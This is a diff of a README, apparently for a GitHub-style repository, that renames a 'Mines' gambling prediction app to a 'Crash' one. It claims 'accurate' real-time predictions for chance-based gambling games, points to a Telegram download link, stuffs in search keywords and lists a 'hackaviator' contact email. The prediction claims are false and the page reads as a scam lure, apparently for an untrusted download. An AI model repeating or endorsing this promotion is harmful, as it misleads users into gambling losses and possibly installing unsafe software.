@@ -6,9 +6,9 @@
 <h3 align="center">
   <table align="center">
     <tr>
-      <th scope="col">Mines Prediction App</th>
-      <th scope="col">08/ 09 / 2025</th>
-      <th scope="col"><a href='https://t.me/Minespredictorx'>Download</a></th>
+      <th scope="col">Crash Prediction App</th>
+      <th scope="col">26/ 10 / 2025</th>
+      <th scope="col"><a href='https://t.me/crashpredictorx'>Download</a></th>
     </tr>
   </table>
 </h3>
@@ -17,10 +17,10 @@
 # Mins Prediction App
 
 ## Overview
-The **Mines Prediction App** is a powerful tool designed to enhance your gaming experience by providing real-time predictions for the Mines game. Available for Windows, iOS, and Android, this app uses advanced algorithms to predict outcomes, helping you make more informed decisions during gameplay.
+The **crash Prediction App** is a powerful tool designed to enhance your gaming experience by providing real-time predictions for the crash game. Available for Windows, iOS, and Android, this app uses advanced algorithms to predict outcomes, helping you make more informed decisions during gameplay.
 
 ## Features
-- **Real-Time Predictions:** Get accurate and timely predictions for the Mines game.
+- **Real-Time Predictions:** Get accurate and timely predictions for the crash game.
 - **Cross-Platform Availability:** Available on Windows, iOS, and Android.
 - **User-Friendly Interface:** Easy to navigate and use, even for beginners.
 - **Regular Updates:** The app is regularly updated to improve prediction accuracy and add new features.
@@ -39,14 +39,14 @@ The **Mines Prediction App** is a powerful tool designed to enhance your gaming 
 4. Adjust settings and preferences according to your needs.
 
 ## Other Searches
-- Mines predictor download apk
-- Mines predictor demo
-- Mines predictor download pc
-- Mines predictor demo apk
-- Mines predictor discord
-- Mines predictor app store
-- Mines predictor play store
-- Mines predictor windows download
+- crash predictor download apk
+- crash predictor demo
+- crash predictor download pc
+- crash predictor demo apk
+- crash predictor discord
+- crash predictor app store
+- crash predictor play store
+- crash predictor windows download
 
 ## Support
-For any issues, feedback, or inquiries, please contact our support team at [Mines](mailto:hackaviator@proton.me).
+For any issues, feedback, or inquiries, please contact our support team at [crash](mailto:hackaviator@proton.me).
